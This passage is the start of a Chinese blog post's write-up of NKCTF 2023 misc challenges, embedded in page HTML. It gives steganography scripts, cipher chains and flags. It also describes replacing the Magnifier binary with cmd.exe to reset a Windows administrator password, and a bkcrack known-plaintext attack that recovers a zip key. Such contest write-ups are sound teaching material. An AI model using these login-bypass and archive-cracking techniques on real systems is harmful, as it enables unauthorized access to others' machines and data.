@@ -1,0 +1,1094 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" href="/img/favicon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lewiserii">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="rank：15  Mischard-miscbase32，公众号发NKCTF2023我来了！ blue先导入进vmware，开机发现是windows2008系统，用户带密码 挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符  复制一份cmd到放大镜  左下角启动放大镜功能后就启动了cmd，修改administrator密码  进入系统  easymusic根">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023NKCTF-wp">
+<meta property="og:url" content="https://www.lewiserii.top/wp/NKCTF2023.html">
+<meta property="og:site_name" content="lewiserii&#39;s blog">
+<meta property="og:description" content="rank：15  Mischard-miscbase32，公众号发NKCTF2023我来了！ blue先导入进vmware，开机发现是windows2008系统，用户带密码 挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符  复制一份cmd到放大镜  左下角启动放大镜功能后就启动了cmd，修改administrator密码  进入系统  easymusic根">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/NKCTF2023.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-4.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easymusic-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_rgb-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-4.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_word-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_bmp-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_music-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/THMaster-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/signin-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/decompile_revenge-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_cms-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/webpagetest-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_pms-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Bridge-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E7%8B%82%E9%A3%99-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Ferris_Wheel-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E6%97%85%E7%A8%8B%E7%9A%84%E5%BC%80%E5%A7%8B-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/The%20other%20Bridge-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/PMKF-1.jpg">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/babyrust-1.jpg">
+<meta property="article:published_time" content="2023-03-26T13:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-27T12:55:19.600Z">
+<meta property="article:author" content="lewiserii">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="nkctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/NKCTF2023.png">
+  
+  
+  
+  <title>2023NKCTF-wp - lewiserii&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.lewiserii.top","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"150aacf9a16405ad4ea9ead54ecac598","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.lewiserii.top","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="lewiserii's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lewiserii&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                时间轴
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://www.lewiserii.top/team/">
+                <i class="iconfont icon-users"></i>
+                团队
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/fluid-bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023NKCTF-wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        lewiserii
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-26 21:00" pubdate>
+          2023年3月26日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          27k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          271 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2023NKCTF-wp</h1>
+            
+            <div class="markdown-body">
+              
+              <p>rank：15</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/NKCTF2023.png"></p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hard-misc"><a href="#hard-misc" class="headerlink" title="hard-misc"></a>hard-misc</h2><p><code>base32</code>，公众号发<code>NKCTF2023我来了！</code></p>
+<h2 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h2><p>先导入进vmware，开机发现是windows2008系统，用户带密码</p>
+<p>挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-3.png"></p>
+<p>复制一份cmd到放大镜</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-4.png"></p>
+<p>左下角启动放大镜功能后就启动了cmd，修改administrator密码</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-1.png"></p>
+<p>进入系统</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-2.png"></p>
+<h2 id="easymusic"><a href="#easymusic" class="headerlink" title="easymusic"></a>easymusic</h2><p>根据提示百度搜到了类似的一题<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1676153">2020天翼杯-音频隐写</a></p>
+<p>使用<code>OpenPuff</code>工具</p>
+<p>文件尾得到<code>psdC:01374890</code></p>
+<p>频谱找到<code>PSdB:74208645</code></p>
+<p>波形转换得到<code>psdA:83979367</code></p>
+<p>导出flag.txt</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easymusic-1.png"></p>
+<h2 id="easy-rgb"><a href="#easy-rgb" class="headerlink" title="easy_rgb"></a>easy_rgb</h2><p>montage+gaps画图<br><code>montage *.png -tile 12X15 -geometry +0+0 flag.png</code><br><code>gaps --image=flag.png --generation=30 --population=300 --size=125</code></p>
+<p>得到key：<code>NKCTF2023</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_rgb-1.png"></p>
+<p><code>r</code>,<code>g</code>,<code>b</code>转成<code>zip</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">r=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;r.txt&#x27;</span>).read()<br>g=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;g.txt&#x27;</span>).read()<br>b=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.txt&#x27;</span>).read()<br>e=<span class="hljs-string">&quot;&quot;</span><br>m=<span class="hljs-built_in">max</span>([<span class="hljs-built_in">len</span>(r),<span class="hljs-built_in">len</span>(b),<span class="hljs-built_in">len</span>(g)])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    <span class="hljs-keyword">try</span>:<br>        e+=r[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=g[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=b[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>
+
+<p>得到hint：<code>AES-128</code>和data：<code>IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+</code></p>
+<p>在线aes-128解密，key为<code>NKCTF2023</code></p>
+<h2 id="first-spam-of-rabbit-year"><a href="#first-spam-of-rabbit-year" class="headerlink" title="first spam of rabbit year"></a>first spam of rabbit year</h2><p><a target="_blank" rel="noopener" href="https://www.spammimic.com/decode.cgi">垃圾邮件</a>解密得到<code>佛曰：栗楞穆婆悉遮俱吉室嚧无佛吉埵沙他蒙蒙唎皤啰烁伽驮数迦帝楞萨那摩度驮伽度耶萨那曳喝写怛钵遮耶烁埵室摩迦尼菩呼阇栗墀豆哆烁利吉舍阿萨俱夜嚧蒙喝喝诃罚悉阇喝无数那迦陀室沙穆皤南陀娑利烁输夜输参陀数醯诃提耶钵遮夜栗谨伽俱菩度咩烁室醯迦输诃度唎阇钵无羯栗提摩谨咩悉哆阇室悉钵楞那他伽啰伊耶谨那尼那呼伊罚卢输南喝豆娑伽唎醯嚧那嚧羯摩吉参喝那阿地墀数陀楞啰孕罚度醯菩萨埵埵栗他穆菩参舍迦羯沙啰吉尼楞怛尼孕苏地遮苏提曳谨阇那啰阇南曳输曳伊苏伊度啰咩提苏他他娑驮俱婆钵室利烁俱伽写利羯悉阇遮皤佛南悉阿帝萨喝悉阇参参楞罚皤苏喝墀诃他吉伽提利尼埵啰输嚧醯婆伽墀菩唎娑谨他怛写沙伽啰烁摩栗埵伊啰俱楞帝写地卢利怛吉帝陀阿唵伊伽谨曳阇羯娑羯嚧埵唎烁楞喝曳输他阿室钵谨啰楞他呼娑喝菩哆蒙穆诃婆烁他夜孕穆诃钵佛参室悉舍萨穆室遮阿喝啰伽耶喝漫</code></p>
+<p>社会主义核心价值观解密得到<code>rabbit 又 move</code></p>
+<p>佛曰加个又，key是<code>rabbit</code>，解密得到密文</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&amp;​​​​‍‎‏auD5​​​​‏‍​v&#x27;&lt;)​​​​‏‍‌`h​​​​‎​‏&#123;dF6C_*&#x27;Jrcqzrh&amp;ZaF&gt;`g^​​​​‏‍‌Hr&#x27;&#125;vuHZJB​​​​‎​‏%~&#125;_H5?gu​​​​‌‏‏;q​​​​‍‏‌)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w_tip:47&amp;13<br></code></pre></td></tr></table></figure>
+
+<p>0宽得到key：<code>EnoOoO1G</code></p>
+<p>根据结尾的提示，密文rot47，key rot13</p>
+<p>得到<code>U2FsdGVkX19L5uer0YVyC4BKC9U+2um18/wCVNGFw+yqTON0wdn8FjBXQkCpnLDwaLx727z7FleH</code>和<code>RabBbB1T</code></p>
+<p>在线rabbit得到<code>NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;</code></p>
+<h2 id="misc-iot"><a href="#misc-iot" class="headerlink" title="misc?iot!"></a>misc?iot!</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/229321">参考文章</a></p>
+<p>选择<code>arm little-endian</code></p>
+<p>如果要写地址默认为<code>0x8000000</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-1.png"></p>
+<p>sub_800014C是rc4生成密钥的过程</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-2.png"></p>
+<p>复制密钥的过程，得到key：<code>NKCTF2023</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-3.png"></p>
+<p>从V5开始的18个字节是密文，小端序提取出来：<code>245F02E287A0A76C072A75DA3F8A57D71A1F</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-4.png"></p>
+<p>在线rc4解密得到<code>NKCTF&#123;H3l10_stm32&#125;</code></p>
+<h2 id="easy-word"><a href="#easy-word" class="headerlink" title="easy_word"></a>easy_word</h2><p>根据注释中的提示爆破密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>base=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>**<span class="hljs-number">4</span>):<br>    d=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        d.append(base[j%<span class="hljs-number">62</span>])<br>        j=j//<span class="hljs-number">62</span><br>    d=<span class="hljs-built_in">tuple</span>(d)<br>    e=<span class="hljs-string">&quot;h%s%svO%s%s0&quot;</span>%d<br>    <span class="hljs-built_in">hash</span>=hashlib.sha256(e.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;b75d1224&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">hash</span>[:<span class="hljs-number">8</span>]:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(e)<br><br></code></pre></td></tr></table></figure>
+
+<p>改成zip解压，<code>media</code>目录下有一张<code>image1.png</code>，图片上有key：<code>Welcome_to_NKCTF</code></p>
+<p><code>cloacked-pixel</code>得到flag</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_word-1.png"></p>
+<h2 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h2><p>stegsolve观察发现<code>green</code>和<code>blue</code>有数据，脚本提取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;3.bmp&#x27;</span>)<br>d=a.getdata()<br>w,h=a.size<br>e=[]<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        i=a.getpixel((x,y))<br>        e.append(<span class="hljs-built_in">chr</span>((i[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+i[<span class="hljs-number">2</span>]))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;&#x27;</span>.join(e))<br></code></pre></td></tr></table></figure>
+
+<p>得到<code>NKCTF&#123;3d77dc1a37b2d1ebf489c973f554ea10&#125;</code></p>
+<h2 id="easy-bmp"><a href="#easy-bmp" class="headerlink" title="easy_bmp"></a>easy_bmp</h2><p>在010中分别修改高和宽，得到key：<code>BMP_Height_width_easy</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_bmp-1.png"></p>
+<p>解压后得到<code>flag.bmp</code>，继续爆破宽高，<code>360*360</code>，扫二维码得到flag</p>
+<p><code>NKCTF&#123;eab1291e-9e37-4ff1-b76d-f1af63eaad43&#125;</code></p>
+<h2 id="baby-music"><a href="#baby-music" class="headerlink" title="baby_music"></a>baby_music</h2><p>010打开，发现很多重复的<code>10 27</code>和<code>11 27</code></p>
+<p>将<code>10 27</code>转为<code>0</code>，<code>11 27</code>转为<code>1</code></p>
+<p>二进制转文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.wav&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()[<span class="hljs-number">0x2c</span>:]<br>e=[]<br>q=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">if</span> d[i]==<span class="hljs-number">0x10</span>:<br>        q+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        q+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(q)==<span class="hljs-number">8</span>:<br>        e.append(<span class="hljs-built_in">int</span>(q,<span class="hljs-number">2</span>))<br>        q=<span class="hljs-string">&quot;&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure>
+
+<p>发现是<code>zip</code></p>
+<p>注释中<code>0</code>转为<code>.</code>，<code>1</code>转为<code>-</code>，<code>换行</code>转为<code>/</code></p>
+<p><code>.--/./.-../-.-./---/--/./-/---/-./-.-/-.-./-/..-./--..--/-/...././.--./.-/.../.../.--/---/.-./-../../.../.----/-..../-.../-.--/-/./.../.-./.-/-./-../---/--/.-../-.--/--././-././.-./.-/-/./-../--..--/../.../-/...././.-././.-/-..././-/-/./.-./.--/.-/-.--/-/---/..-/-./.-../---/-.-./-.-/-/...././--../../.--./..--..</code></p>
+<p>解摩斯得到<br><code>WELCOME TO NKCTF,THEPASSWORDIS16BYTESRANDOMLYGENERATED,ISTHEREABETTERWAYTOUNLOCKTHEZIP?</code></p>
+<p>根据提示，猜测是深入明文攻击</p>
+<p>先构造已知的明文，即<code>flag.png</code>的文件头加<code>IHDR</code>，写入到<code>plain.txt</code></p>
+<p>plain.txt：<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code></p>
+<p>使用<code>bkcrack</code>爆破key</p>
+<p><code>bkcrack.exe -C flag.zip -c flag.png -p plain.txt</code></p>
+<p>修改<code>flag.zip</code>的密码</p>
+<p><code>bkcrack.exe -C flag.zip -k 846ad344 02327731 173ff347 -U 1.zip easy</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_music-1.png"></p>
+<p>解压得到flag</p>
+<p><code>NKCTF&#123;You_are_very_smart!!&#125;</code></p>
+<h2 id="THMaster"><a href="#THMaster" class="headerlink" title="THMaster"></a>THMaster</h2><p>先开启<code>THmaster.exe</code>监听，再开启<code>th12.exe</code></p>
+<p>ce修改分数到2亿多</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/THMaster-1.png"></p>
